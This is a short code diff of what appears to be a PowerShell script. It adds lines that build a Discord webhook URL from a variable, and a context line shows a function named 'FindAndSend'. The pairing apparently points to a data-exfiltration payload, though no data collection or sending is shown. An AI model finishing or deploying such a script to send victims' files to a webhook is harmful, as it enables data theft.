@@ -31,6 +31,9 @@ Nimble – Quick and light in movement or action.
 #>
 
 $hookurl = "$dc"
+if ($hookurl.Length -lt 120){
+	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 Function FindAndSend {
 
